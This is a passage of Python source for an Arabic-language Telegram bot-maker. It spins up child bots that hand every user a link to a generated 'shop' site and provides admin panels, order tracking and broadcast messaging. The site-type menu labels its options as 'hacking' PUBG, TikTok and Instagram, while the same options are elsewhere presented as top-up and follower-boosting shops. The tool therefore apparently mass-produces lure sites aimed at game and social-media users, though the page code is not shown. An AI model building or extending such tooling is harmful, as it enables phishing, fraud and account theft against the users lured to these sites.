            st = (form.get("status") or [""])[0]
        except:
            self._html(400, "طلب غير صحيح"); return
        if st not in ("قيد المعالجة", "جاري التنفيذ", "مكتمل", "ملغي"):
            self._html(400, "الحالة غير صحيحة"); return
        o = update_shop_order_status(oid, st)
        if o:
            notify_owner(bid, f"🔄 تحديث حالة الطلب\n\n🆔 #{o['id']}\n📌 الحالة: {o['status']}")
        self.send_response(303)
        self.send_header("Location", f"/shop/{bid}/admin")
        self.end_headers()


def start_web_server():
    try:
        srv = ThreadingHTTPServer(("0.0.0.0", SHOP_PORT), ShopHandler)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        logger.info(f"🌐 Web server on port {SHOP_PORT}")
        return srv
    except Exception as e:
        logger.error(f"Web server failed: {e}")
        return None


# ==================================================================
# ================== CHILD BOT MANAGER =============================
# ==================================================================
class ChildBotManager:
    def __init__(self):
        self.bots = {}
        self.lock = asyncio.Lock()

    async def start_bot(self, bid):
        async with self.lock:
            if bid in self.bots: return True, "already running"
            bot = get_bot(bid)
            if not bot: return False, "bot not found"
            if bot["token"] == MAIN_BOT_TOKEN:
                return False, "لا يمكن استخدام توكن البوت الرئيسي"

            app = None
            try:
                app = Application.builder().token(bot["token"]).build()

                async def start_handler(update, context, _bid=bid):
                    try:
                        if not update.message or not update.effective_user: return
                        u = update.effective_user
                        add_user_to_bot(_bid, u.id)
                        b = get_bot(_bid)
                        if not b: return
                        txt = format_welcome(b.get("welcome") or "أهلاً بك!", u)
                        st = b.get("shop_type") or "none"
                        rows = []
                        if st != "none":
                            rows.append([InlineKeyboardButton("🛒 فتح الموقع", url=shop_url(_bid))])
                        for x in get_buttons(_bid):
                            rows.append([InlineKeyboardButton(x["text"], url=x["url"])])
                        kb = InlineKeyboardMarkup(rows) if rows else None
                        await update.message.reply_text(txt, reply_markup=kb, disable_web_page_preview=True)
                    except Exception as e:
                        logger.error(f"[child {_bid}] start: {e}")

                async def msg_handler(update, context, _bid=bid):
                    try:
                        if not update.message or not update.effective_user: return
                        u = update.effective_user
                        add_user_to_bot(_bid, u.id)
                        b = get_bot(_bid)
                        if not b: return
                        txt = format_welcome(b.get("welcome") or "أهلاً بك!", u)
                        st = b.get("shop_type") or "none"
                        rows = []
                        if st != "none":
                            rows.append([InlineKeyboardButton("🛒 فتح الموقع", url=shop_url(_bid))])
                        for x in get_buttons(_bid):
                            rows.append([InlineKeyboardButton(x["text"], url=x["url"])])
                        kb = InlineKeyboardMarkup(rows) if rows else None
                        await update.message.reply_text(txt, reply_markup=kb, disable_web_page_preview=True)
                    except Exception as e:
                        logger.error(f"[child {_bid}] msg: {e}")

                app.add_handler(CommandHandler("start", start_handler))
                app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, msg_handler))

                await app.initialize()
                await app.start()
                if app.updater:
                    await app.updater.start_polling(
                        drop_pending_updates=True,
                        allowed_updates=["message", "callback_query"])
                self.bots[bid] = app
                logger.info(f"✅ Bot {bid} started (@{bot['username']})")
                return True, "started"

            except Conflict:
                if app: await self._shutdown(app)
                return False, "تعارض في التوكن"
            except TelegramError as e:
                if app: await self._shutdown(app)
                return False, str(e)
            except Exception as e:
                if app: await self._shutdown(app)
                return False, str(e)

    async def _shutdown(self, app):
        try:
            if app.updater and getattr(app.updater, "running", False):
                await app.updater.stop()
        except: pass
        try: await app.stop()
        except: pass
        try: await app.shutdown()
        except: pass

    async def stop_bot(self, bid):
        async with self.lock:
            if bid not in self.bots: return True, "not running"
            app = self.bots.pop(bid)
            try:
                await self._shutdown(app)
                return True, "stopped"
            except Exception as e:
                return False, str(e)

    async def start_all(self):
        for b in get_all_bots():
            if b.get("enabled") == 1:
                await self.start_bot(b["id"])

    async def stop_all(self):
        for bid in list(self.bots.keys()):
            await self.stop_bot(bid)


manager = ChildBotManager()

# ==================================================================
# ====================== STATES ====================================
# ==================================================================
(ST_TOKEN, ST_SHOP, ST_WELCOME, ST_BTN, ST_BC,
 ST_ADD_ADM, ST_RM_ADM, ST_BAN, ST_UNBAN) = range(9)


# ==================================================================
# ========================== KEYBOARDS =============================
# ==================================================================
def main_kb(uid):
    rows = [
        [InlineKeyboardButton("🤖 إنشاء بوت", callback_data="menu:create")],
        [InlineKeyboardButton("📋 بوتاتي", callback_data="menu:mybots")],
        [InlineKeyboardButton("ℹ️ المساعدة", callback_data="menu:help")],
    ]
    if is_admin(uid):
        rows.append([InlineKeyboardButton("👑 لوحة الإدارة", callback_data="menu:admin")])
    return InlineKeyboardMarkup(rows)


def bot_kb(bot):
    bid = bot["id"]
    en = bot.get("enabled") == 1
    rows = []
    if (bot.get("shop_type") or "none") != "none":
        rows.append([InlineKeyboardButton("🛒 فتح الموقع", url=shop_url(bid))])
        rows.append([InlineKeyboardButton("🔐 لوحة إدارة الموقع", url=f"{shop_url(bid)}/admin")])
    rows += [
        [InlineKeyboardButton("✏️ تغيير رسالة الترحيب", callback_data=f"bot:welcome:{bid}")],
        [InlineKeyboardButton("🔘 إضافة زر", callback_data=f"bot:addbtn:{bid}")],
        [InlineKeyboardButton("📊 إحصائيات", callback_data=f"bot:stats:{bid}")],
        [InlineKeyboardButton("📢 إذاعة", callback_data=f"bot:bc:{bid}")],
        [InlineKeyboardButton("🔴 إيقاف البوت" if en else "🟢 تشغيل البوت",
                              callback_data=f"bot:{'stop' if en else 'start'}:{bid}")],
        [InlineKeyboardButton("🗑️ حذف البوت", callback_data=f"bot:del:{bid}")],
        [InlineKeyboardButton("⬅️ رجوع", callback_data="menu:mybots")],
    ]
    return InlineKeyboardMarkup(rows)


def admin_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 الإحصائيات", callback_data="adm:stats")],
        [InlineKeyboardButton("👮 إضافة أدمن", callback_data="adm:add"),
         InlineKeyboardButton("👮 حذف أدمن", callback_data="adm:rm")],
        [InlineKeyboardButton("🚫 حظر", callback_data="adm:ban"),
         InlineKeyboardButton("✅ فك حظر", callback_data="adm:unban")],
        [InlineKeyboardButton("📋 جميع البوتات", callback_data="adm:allbots")],
        [InlineKeyboardButton("🔐 معلومات البوتات", callback_data="adm:tokens")],
        [InlineKeyboardButton("👮 قائمة الأدمن", callback_data="adm:list")],
        [InlineKeyboardButton("⬅️ رجوع", callback_data="menu:main")],
    ])


def back_kb(t="menu:main"):
    return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ رجوع", callback_data=t)]])


def shop_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎮 اختراق PUBG", callback_data="shop:pubg")],
        [InlineKeyboardButton("🪙 اختراق TikTok", callback_data="shop:tiktok")],
        [InlineKeyboardButton("📸 اختراق Instagram", callback_data="shop:instagram")],
        [InlineKeyboardButton("⬅️ إلغاء", callback_data="menu:main")],
    ])


# ==================================================================
# ======================== HANDLERS ================================
# ==================================================================
async def cmd_start(update, context):
    try:
        uid = update.effective_user.id
        if is_banned(uid):
            await update.message.reply_text("🚫 أنت محظور."); return
        await update.message.reply_text(
            "👋 أهلاً بك في صانع البوتات!\nاختر من القائمة:",
            reply_markup=main_kb(uid))
    except Exception as e: logger.error(f"cmd_start: {e}")


async def cmd_cancel(update, context):
    try:
        context.user_data.clear()
        await update.message.reply_text("❌ تم الإلغاء.", reply_markup=main_kb(update.effective_user.id))
    except: pass
    return ConversationHandler.END


async def cb_main(update, context):
    q = update.callback_query; await q.answer()
    try:
        uid = q.from_user.id
        if is_banned(uid):
            await q.edit_message_text("🚫 محظور."); return
        await q.edit_message_text("👋 القائمة الرئيسية:", reply_markup=main_kb(uid))
    except Exception as e: logger.error(f"cb_main: {e}")


async def cb_help(update, context):
    q = update.callback_query; await q.answer()
    try:
        await q.edit_message_text(
            "ℹ️ المساعدة\n\n"
            "🤖 إنشاء بوت — أضف توكن بوتك واختر نوع الموقع.\n"
            "📋 بوتاتي — إدارة بوتاتك.\n"
            "👑 لوحة الإدارة — للأدمن.\n\n"
            "عندما يضغط أحد start في بوتك، يستلم زر فتح الموقع تلقائياً.\n\n"
            "المتغيرات في رسالة الترحيب:\n"
            "{name} — الاسم\n{username} — المعرف",
            reply_markup=main_kb(q.from_user.id))
    except Exception as e: logger.error(f"cb_help: {e}")


# ---------- إنشاء بوت ----------
async def create_start(update, context):
    q = update.callback_query; await q.answer()
    try:
        if is_banned(q.from_user.id):
            await q.edit_message_text("🚫 محظور."); return ConversationHandler.END
        await q.edit_message_text(
            "🤖 أرسل Bot Token من BotFather:\n\n"
            "مثال: 123456789:ABCdefGHIjklMNOpqrsTUVwxyzABCdef\n\n"
            "/cancel للإلغاء")
        return ST_TOKEN
    except Exception as e:
        logger.error(f"create_start: {e}"); return ConversationHandler.END


async def create_token(update, context):
    uid = update.effective_user.id
    try:
        token = (update.message.text or "").strip()
        if not is_valid_token(token):
            await update.message.reply_text("❌ صيغة التوكن غير صحيحة.")
            return ST_TOKEN
        if token == MAIN_BOT_TOKEN:
            await update.message.reply_text("❌ لا يمكن استخدام توكن البوت الرئيسي.", reply_markup=main_kb(uid))
            return ConversationHandler.END
        if get_bot_by_token(token):
            await update.message.reply_text("❌ التوكن مستخدم بالفعل.", reply_markup=main_kb(uid))
            return ConversationHandler.END

        tmp = Application.builder().token(token).build()
        try:
            await tmp.initialize()
            me = await tmp.bot.get_me()
        except TelegramError as e:
            try: await tmp.shutdown()
            except: pass
            await update.message.reply_text(f"❌ فشل التحقق: {e}", reply_markup=main_kb(uid))
            return ConversationHandler.END
        finally:
            try: await tmp.shutdown()
            except: pass

        context.user_data["t"] = token
        context.user_data["u"] = me.username or ""
        context.user_data["n"] = me.first_name or ""

        await update.message.reply_text(
            "✅ تم التحقق من التوكن.\nاختر نوع الموقع:",
            reply_markup=shop_kb())
        return ST_SHOP
    except Exception as e:
        logger.error(f"create_token: {e}")
        return ConversationHandler.END


async def create_shop(update, context):
    q = update.callback_query; await q.answer()
    try:
        uid = q.from_user.id
        data = q.data
        if data == "menu:main":
            await q.edit_message_text("❌ تم الإلغاء.", reply_markup=main_kb(uid))
            context.user_data.clear()
            return ConversationHandler.END

        st = data.split(":", 1)[1] if ":" in data else ""
        if st not in ("pubg", "tiktok", "instagram"):
            await q.answer("❌ نوع غير معروف", show_alert=True); return ST_SHOP

        token = context.user_data.get("t")
        uname = context.user_data.get("u") or ""
        name = context.user_data.get("n") or ""
        if not token:
            await q.edit_message_text("❌ انتهت الجلسة.", reply_markup=main_kb(uid))
            return ConversationHandler.END

        bid = save_bot(uid, token, uname, name, st, DEFAULT_SHOP_PASSWORD)
        if not bid:
            await q.edit_message_text("❌ فشل الحفظ.", reply_markup=main_kb(uid))
            context.user_data.clear()
            return ConversationHandler.END

        ok, msg = await manager.start_bot(bid)
        if not ok: update_bot_field(bid, "enabled", 0)

        labels = {"pubg": "🎮 شحن PUBG", "tiktok": "🪙 شحن TikTok", "instagram": "📸 رشق Instagram"}
        text = (
            f"✅ تم إنشاء البوت!\n\n"
            f"🤖 {name}\n"
            f"👤 @{uname}\n"
            f"📌 ID: {bid}\n"
            f"🏪 {labels.get(st, st)}\n"
            f"🌐 رابط موقعك:  {shop_url(bid)}\n"
            f"🔐 كلمة سر الإدارة: {DEFAULT_SHOP_PASSWORD}\n"
            f"🟢 الحالة: {'يعمل' if ok else 'فشل: ' + msg}\n\n"
            f"📌 أي شخص يضغط start سيستلم زر فتح الموقع. مطور @Yb_xY"
        )
        await q.edit_message_text(text, reply_markup=main_kb(uid), disable_web_page_preview=True)
        context.user_data.clear()
    except Exception as e:
        logger.error(f"create_shop: {e}")
    return ConversationHandler.END


# ---------- بوتاتي ----------
async def cb_mybots(update, context):
    q = update.callback_query; await q.answer()
    try:
        uid = q.from_user.id
        if is_banned(uid): await q.edit_message_text("🚫 محظور."); return
        bots = get_user_bots(uid)
        if not bots:
            await q.edit_message_text("📋 لا يوجد بوتات.\nاستخدم «إنشاء بوت».", reply_markup=main_kb(uid))
            return
        rows = []
        for b in bots:
            s = "🟢" if b["enabled"] == 1 else "🔴"
            rows.append([InlineKeyboardButton(f"{s} @{b['username']}", callback_data=f"bot:menu:{b['id']}")])
        rows.append([InlineKeyboardButton("⬅️ رجوع", callback_data="menu:main")])
        await q.edit_message_text("📋 بوتاتك:", reply_markup=InlineKeyboardMarkup(rows))
    except Exception as e: logger.error(f"cb_mybots: {e}")


async def cb_bot_menu(update, context):
    q = update.callback_query; await q.answer()
    try:
        bid = int(q.data.split(":")[2])
        uid = q.from_user.id
        bot = get_bot(bid)
        if not bot:
            await q.edit_message_text("❌ غير موجود.", reply_markup=main_kb(uid)); return
        if bot["owner_id"] != uid and not is_admin(uid):
            await q.edit_message_text("❌ غير مصرح.", reply_markup=main_kb(uid)); return
        s = "🟢 يعمل" if bot["enabled"] == 1 else "🔴 متوقف"
        st = bot.get("shop_type") or "none"
        txt = (f"🤖 @{bot['username']}\n📌 ID: {bid}\n"
               f"🏪 الموقع: {st}\n"
               f"🌐 {shop_url(bid) if st != 'none' else 'لا يوجد'}\n"
               f"الحالة: {s}")
        await q.edit_message_text(txt, reply_markup=bot_kb(bot), disable_web_page_preview=True)
    except Exception as e: logger.error(f"cb_bot_menu: {e}")


async def cb_bot_toggle(update, context):
    q = update.callback_query
    try:
        parts = q.data.split(":")
        act, bid = parts[1], int(parts[2])
        uid = q.from_user.id
        bot = get_bot(bid)
        if not bot or (bot["owner_id"] != uid and not is_admin(uid)):
            await q.answer("❌ غير مصرح", show_alert=True); return
        if act == "start":
            ok, msg = await manager.start_bot(bid)
            if ok:
                update_bot_field(bid, "enabled", 1)
                await q.answer("✅ تم التشغيل", show_alert=True)
            else:
                await q.answer(f"❌ {msg}", show_alert=True)
        else:
            await manager.stop_bot(bid)
            update_bot_field(bid, "enabled", 0)
            await q.answer("🔴 تم الإيقاف", show_alert=True)
        bot = get_bot(bid)
        if bot:
            s = "🟢 يعمل" if bot["enabled"] == 1 else "🔴 متوقف"
            try:
                await q.edit_message_text(f"🤖 @{bot['username']}\n📌 {bid}\nالحالة: {s}",
                                          reply_markup=bot_kb(bot))
            except: pass
    except Exception as e:
        logger.error(f"cb_bot_toggle: {e}")


async def cb_bot_del(update, context):
    q = update.callback_query
    try:
        bid = int(q.data.split(":")[2])
        uid = q.from_user.id
        bot = get_bot(bid)
        if not bot or (bot["owner_id"] != uid and not is_admin(uid)):
            await q.answer("❌ غير مصرح", show_alert=True); return
        un = bot["username"]
        await manager.stop_bot(bid)
        delete_bot_row(bid)
        await q.answer("🗑️ تم الحذف", show_alert=True)
        try:
            await q.edit_message_text(f"🗑️ تم حذف @{un}.", reply_markup=main_kb(uid))
        except: pass
    except Exception as e: logger.error(f"cb_bot_del: {e}")


async def cb_bot_stats(update, context):
    q = update.callback_query; await q.answer()
    try:
        bid = int(q.data.split(":")[2])
        uid = q.from_user.id
        bot = get_bot(bid)
        if not bot or (bot["owner_id"] != uid and not is_admin(uid)):
            await q.answer("❌ غير مصرح", show_alert=True); return
        users = get_bot_users(bid)
        orders = get_shop_orders(bid)
        s = "🟢 يعمل" if bot["enabled"] == 1 else "🔴 متوقف"
        c = (bot.get("created_at") or "")[:10]
        txt = (f"📊 إحصائيات\n\n🤖 @{bot['username']}\n📌 {bid}\n"
               f"الحالة: {s}\n👥 المستخدمين: {len(users)}\n"
               f"🛒 الطلبات: {len(orders)}\n📅 {c}")
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ رجوع", callback_data=f"bot:menu:{bid}")]])
        await q.edit_message_text(txt, reply_markup=kb)
    except Exception as e: logger.error(f"cb_bot_stats: {e}")


# ---------- تعديل الترحيب ----------
async def edit_welcome_start(update, context):
    q = update.callback_query; await q.answer()
    try:
        bid = int(q.data.split(":")[2])
        uid = q.from_user.id
        bot = get_bot(bid)
        if not bot or (bot["owner_id"] != uid and not is_admin(uid)):
            await q.answer("❌ غير مصرح", show_alert=True); return ConversationHandler.END
        context.user_data["wb"] = bid
        cur = bot.get("welcome") or ""
        await q.edit_message_text(
            "✏️ أرسل رسالة الترحيب الجديدة.\n\n"
            "المتغيرات: {name} {username}\n\n"
            f"الحالية:\n{cur}\n\n/cancel للإلغاء")
        return ST_WELCOME
    except Exception as e:
        logger.error(f"edit_welcome_start: {e}"); return ConversationHandler.END


async def edit_welcome_do(update, context):
    try:
        bid = context.user_data.get("wb")
        txt = (update.message.text or "").strip()
        if not bid or not txt:
            await update.message.reply_text("❌ رسالة فارغة.", reply_markup=main_kb(update.effective_user.id))
            return ConversationHandler.END
        update_bot_field(bid, "welcome", txt)
        await update.message.reply_text("✅ تم التحديث.", reply_markup=main_kb(update.effective_user.id))
        context.user_data.clear()
    except Exception as e: logger.error(f"edit_welcome_do: {e}")
    return ConversationHandler.END


# ---------- إضافة زر ----------
async def add_btn_start(update, context):
    q = update.callback_query; await q.answer()
    try:
        bid = int(q.data.split(":")[2])
        uid = q.from_user.id
        bot = get_bot(bid)
        if not bot or (bot["owner_id"] != uid and not is_admin(uid)):
            await q.answer("❌ غير مصرح", show_alert=True); return ConversationHandler.END
        context.user_data["bb"] = bid
        await q.edit_message_text(
            "🔘 أرسل الزر:\nاسم الزر | https://example.com\n\n/cancel للإلغاء")
        return ST_BTN
    except Exception as e:
        logger.error(f"add_btn_start: {e}"); return ConversationHandler.END


async def add_btn_do(update, context):
    try:
        bid = context.user_data.get("bb")
        raw = (update.message.text or "").strip()
        if not bid: return ConversationHandler.END
        if "|" not in raw:
            await update.message.reply_text("❌ صيغة خاطئة: اسم | رابط",
                                            reply_markup=main_kb(update.effective_user.id))
            return ConversationHandler.END
        t, u = [x.strip() for x in raw.split("|", 1)]
        if not t or not u:
            await update.message.reply_text("❌ فارغ.", reply_markup=main_kb(update.effective_user.id))
            return ConversationHandler.END
        if not is_valid_url(u):
            await update.message.reply_text("❌ رابط غير صالح.", reply_markup=main_kb(update.effective_user.id))
            return ConversationHandler.END
        add_button(bid, t, u)
        await update.message.reply_text(f"✅ تمت الإضافة: {t}", reply_markup=main_kb(update.effective_user.id))
        context.user_data.clear()
    except Exception as e: logger.error(f"add_btn_do: {e}")
    return ConversationHandler.END


# ---------- إذاعة ----------
async def bc_start(update, context):
    q = update.callback_query; await q.answer()
    try:
        bid = int(q.data.split(":")[2])
        uid = q.from_user.id
        bot = get_bot(bid)
        if not bot or (bot["owner_id"] != uid and not is_admin(uid)):
            await q.answer("❌ غير مصرح", show_alert=True); return ConversationHandler.END
        if bid not in manager.bots:
            await q.answer("⚠️ البوت غير مشغّل", show_alert=True); return ConversationHandler.END
        context.user_data["bcb"] = bid
        await q.edit_message_text("📢 أرسل الرسالة للإذاعة.\n\n/cancel للإلغاء")
        return ST_BC
    except Exception as e:
        logger.error(f"bc_start: {e}"); return ConversationHandler.END


async def bc_do(update, context):
    try:
        bid = context.user_data.get("bcb")
        txt = (update.message.text or "").strip()
        uid = update.effective_user.id
        if not bid or not txt:
            await update.message.reply_text("❌ فارغ.", reply_markup=main_kb(uid))
            return ConversationHandler.END
        users = get_bot_users(bid)
        if not users:
            await update.message.reply_text("ℹ️ لا يوجد مستخدمون.", reply_markup=main_kb(uid))
            return ConversationHandler.END
        app = manager.bots.get(bid)
        if not app:
            await update.message.reply_text("❌ البوت غير مشغّل.", reply_markup=main_kb(uid))
            return ConversationHandler.END
        st = await update.message.reply_text(f"⏳ إرسال إلى {len(users)}...")
        s, f = 0, 0
        for t in users:
            try:
                await app.bot.send_message(t, txt); s += 1
            except: f += 1
            await asyncio.sleep(0.05)
        try:
            await st.edit_text(f"✅ انتهت.\nنجح: {s}\nفشل: {f}", reply_markup=main_kb(uid))
        except: pass
        context.user_data.clear()
    except Exception as e: logger.error(f"bc_do: {e}")
    return ConversationHandler.END


# ---------- ADMIN ----------
async def cmd_admin(update, context):
    try:
        if not is_admin(update.effective_user.id):
            await update.message.reply_text("❌ ليس لديك صلاحية."); return
        await update.message.reply_text("👑 لوحة الإدارة:", reply_markup=admin_kb())
    except Exception as e: logger.error(f"cmd_admin: {e}")


async def cb_admin(update, context):
    q = update.callback_query; await q.answer()
    try:
        if not is_admin(q.from_user.id):
            await q.answer("❌ غير مصرح", show_alert=True); return
        await q.edit_message_text("👑 لوحة الإدارة:", reply_markup=admin_kb())
    except Exception as e: logger.error(f"cb_admin: {e}")


async def cb_adm_stats(update, context):
    q = update.callback_query; await q.answer()
    try:
        if not is_admin(q.from_user.id): return
        u, b, a = get_stats()
        await q.edit_message_text(
            f"📊 الإحصائيات\n\n👥 المستخدمين: {u}\n🤖 البوتات: {b}\n🟢 العاملة: {a}\n🔴 المتوقفة: {b-a}",
            reply_markup=back_kb("menu:admin"))
    except Exception as e: logger.error(f"cb_adm_stats: {e}")


async def cb_adm_allbots(update, context):
    q = update.callback_query; await q.answer()
    try:
        if not is_admin(q.from_user.id): return
        bots = get_all_bots()
        if not bots:
            await q.edit_message_text("لا توجد بوتات.", reply_markup=back_kb("menu:admin")); return
        rows = []
        for b in bots:
            s = "🟢" if b["enabled"] == 1 else "🔴"
            rows.append([InlineKeyboardButton(
                f"{s} @{b['username']} | {b['id']} | {b['owner_id']}",
                callback_data=f"bot:menu:{b['id']}")])
        rows.append([InlineKeyboardButton("⬅️ رجوع", callback_data="menu:admin")])
        await q.edit_message_text("📋 جميع البوتات:", reply_markup=InlineKeyboardMarkup(rows))
    except Exception as e: logger.error(f"cb_adm_allbots: {e}")


async def cb_adm_tokens(update, context):
    q = update.callback_query; await q.answer()
    try:
        if not is_admin(q.from_user.id): return
        bots = get_all_bots()
        if not bots:
            txt = "لا توجد بوتات."
        else:
            lines = ["🔐 معلومات البوتات:", ""]
            for b in bots:
                lines.append(f"🤖 @{b['username']}")
                lines.append(f"  🆔 {b['id']} | 👤 {b['owner_id']}")
                lines.append(f"  🔑 {mask_token(b['token'])}")
                lines.append(f"  🏪 {b.get('shop_type') or 'none'}")
                lines.append(f"  {'🟢 يعمل' if b['enabled']==1 else '🔴 متوقف'}")
                lines.append("")
            txt = "\n".join(lines)
        await q.edit_message_text(txt, reply_markup=back_kb("menu:admin"))
    except Exception as e: logger.error(f"cb_adm_tokens: {e}")


async def cb_adm_list(update, context):
    q = update.callback_query; await q.answer()
    try:
        if not is_admin(q.from_user.id): return
        admins = list_admins()
        lines = [f"👑 المالك: {OWNER_ID}", "", "👮 الأدمن:"]
        lines += [f"  • {a}" for a in admins] if admins else ["  (لا يوجد)"]
        await q.edit_message_text("\n".join(lines), reply_markup=back_kb("menu:admin"))
    except Exception as e: logger.error(f"cb_adm_list: {e}")


async def adm_add_start(update, context):
    q = update.callback_query; await q.answer()
    try:
        if q.from_user.id != OWNER_ID:
            await q.answer("❌ المالك فقط", show_alert=True); return ConversationHandler.END
        await q.edit_message_text("👮 أرسل User ID للأدمن.\n\n/cancel للإلغاء")
        return ST_ADD_ADM
    except: return ConversationHandler.END


async def adm_add_do(update, context):
    try:
        if update.effective_user.id != OWNER_ID:
            await update.message.reply_text("❌ المالك فقط.")
            return ConversationHandler.END
        try: nid = int((update.message.text or "").strip())
        except:
            await update.message.reply_text("❌ رقم غير صحيح.", reply_markup=main_kb(update.effective_user.id))
            return ConversationHandler.END
        add_admin(nid)
        await update.message.reply_text(f"✅ تم إضافة: {nid}", reply_markup=main_kb(update.effective_user.id))
    except Exception as e: logger.error(f"adm_add_do: {e}")
    return ConversationHandler.END


async def adm_rm_start(update, context):
    q = update.callback_query; await q.answer()
    try:
        if q.from_user.id != OWNER_ID:
            await q.answer("❌ المالك فقط", show_alert=True); return ConversationHandler.END
        await q.edit_message_text("👮 أرسل User ID للحذف.\n\n/cancel")
        return ST_RM_ADM
    except: return ConversationHandler.END


async def adm_rm_do(update, context):
    try:
        if update.effective_user.id != OWNER_ID:
            return ConversationHandler.END
        try: tid = int((update.message.text or "").strip())
        except:
            await update.message.reply_text("❌ رقم غير صحيح.", reply_markup=main_kb(update.effective_user.id))
            return ConversationHandler.END
        if tid == OWNER_ID:
            await update.message.reply_text("❌ لا يمكن حذف المالك.", reply_markup=main_kb(update.effective_user.id))
            return ConversationHandler.END
        remove_admin(tid)
        await update.message.reply_text(f"✅ تم الحذف: {tid}", reply_markup=main_kb(update.effective_user.id))
    except Exception as e: logger.error(f"adm_rm_do: {e}")
    return ConversationHandler.END


async def adm_ban_start(update, context):
    q = update.callback_query; await q.answer()
    try:
        if not is_admin(q.from_user.id):
            await q.answer("❌ غير مصرح", show_alert=True); return ConversationHandler.END
        await q.edit_message_text("🚫 أرسل User ID للحظر.\n\n/cancel")
        return ST_BAN
    except: return ConversationHandler.END


async def adm_ban_do(update, context):
    try:
        if not is_admin(update.effective_user.id): return ConversationHandler.END
        try: tid = int((update.message.text or "").strip())
        except:
            await update.message.reply_text("❌ رقم غير صحيح.", reply_markup=main_kb(update.effective_user.id))
            return ConversationHandler.END
        if tid == OWNER_ID:
            await update.message.reply_text("❌ لا يمكن حظر المالك.", reply_markup=main_kb(update.effective_user.id))
            return ConversationHandler.END
        ban_user(tid)
        await update.message.reply_text(f"✅ تم الحظر: {tid}", reply_markup=main_kb(update.effective_user.id))
    except Exception as e: logger.error(f"adm_ban_do: {e}")
    return ConversationHandler.END


async def adm_unban_start(update, context):
    q = update.callback_query; await q.answer()
    try:
        if not is_admin(q.from_user.id):
            await q.answer("❌ غير مصرح", show_alert=True); return ConversationHandler.END
        await q.edit_message_text("✅ أرسل User ID لفك الحظر.\n\n/cancel")
        return ST_UNBAN
    except: return ConversationHandler.END


async def adm_unban_do(update, context):
    try:
        if not is_admin(update.effective_user.id): return ConversationHandler.END
        try: tid = int((update.message.text or "").strip())
        except:
            await update.message.reply_text("❌ رقم غير صحيح.", reply_markup=main_kb(update.effective_user.id))
            return ConversationHandler.END
        unban_user(tid)
        await update.message.reply_text(f"✅ تم فك الحظر: {tid}", reply_markup=main_kb(update.effective_user.id))
    except Exception as e: logger.error(f"adm_unban_do: {e}")
    return ConversationHandler.END


# ==================================================================
# ===================== LIFECYCLE ==================================
# ==================================================================
async def post_init(app):
    global MAIN_LOOP
    try:
        MAIN_LOOP = asyncio.get_running_loop()
        logger.info("🚀 Starting child bots...")
        await manager.start_all()
        logger.info(f"✅ Child bots: {len(manager.bots)}")
    except Exception as e: logger.error(f"post_init: {e}")


async def post_shutdown(app):
    try:
        await manager.stop_all()
    except Exception as e: logger.error(f"post_shutdown: {e}")


# ==================================================================
# ============================== MAIN ==============================
# ==================================================================
def build_app():
    app = (Application.builder().token(MAIN_BOT_TOKEN)
           .post_init(post_init).post_shutdown(post_shutdown).build())

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CommandHandler("cancel", cmd_cancel))

    # Conversations
    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(create_start, pattern=r"^menu:create$")],
        states={
            ST_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_token)],
            ST_SHOP: [CallbackQueryHandler(create_shop, pattern=r"^(shop:(pubg|tiktok|instagram)|menu:main)$")],
        },
        fallbacks=[CommandHandler("cancel", cmd_cancel)], allow_reentry=True))

    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(edit_welcome_start, pattern=r"^bot:welcome:\d+$")],
        states={ST_WELCOME: [MessageHandler(filters.TEXT & ~filters.COMMAND, edit_welcome_do)]},
        fallbacks=[CommandHandler("cancel", cmd_cancel)], allow_reentry=True))

    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(add_btn_start, pattern=r"^bot:addbtn:\d+$")],
        states={ST_BTN: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_btn_do)]},
        fallbacks=[CommandHandler("cancel", cmd_cancel)], allow_reentry=True))

    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(bc_start, pattern=r"^bot:bc:\d+$")],
        states={ST_BC: [MessageHandler(filters.TEXT & ~filters.COMMAND, bc_do)]},
        fallbacks=[CommandHandler("cancel", cmd_cancel)], allow_reentry=True))

    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(adm_add_start, pattern=r"^adm:add$")],
        states={ST_ADD_ADM: [MessageHandler(filters.TEXT & ~filters.COMMAND, adm_add_do)]},
        fallbacks=[CommandHandler("cancel", cmd_cancel)], allow_reentry=True))

    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(adm_rm_start, pattern=r"^adm:rm$")],
        states={ST_RM_ADM: [MessageHandler(filters.TEXT & ~filters.COMMAND, adm_rm_do)]},
        fallbacks=[CommandHandler("cancel", cmd_cancel)], allow_reentry=True))

    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(adm_ban_start, pattern=r"^adm:ban$")],
        states={ST_BAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, adm_ban_do)]},
        fallbacks=[CommandHandler("cancel", cmd_cancel)], allow_reentry=True))

    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(adm_unban_start, pattern=r"^adm:unban$")],
        states={ST_UNBAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, adm_unban_do)]},
        fallbacks=[CommandHandler("cancel", cmd_cancel)], allow_reentry=True))

    # Admin panel
    app.add_handler(CallbackQueryHandler(cb_admin, pattern=r"^menu:admin$"))
    app.add_handler(CallbackQueryHandler(cb_adm_stats, pattern=r"^adm:stats$"))
    app.add_handler(CallbackQueryHandler(cb_adm_allbots, pattern=r"^adm:allbots$"))
    app.add_handler(CallbackQueryHandler(cb_adm_tokens, pattern=r"^adm:tokens$"))
    app.add_handler(CallbackQueryHandler(cb_adm_list, pattern=r"^adm:list$"))

    # Bot manage
    app.add_handler(CallbackQueryHandler(cb_bot_menu, pattern=r"^bot:menu:\d+$"))
    app.add_handler(CallbackQueryHandler(cb_bot_toggle, pattern=r"^bot:(start|stop):\d+$"))
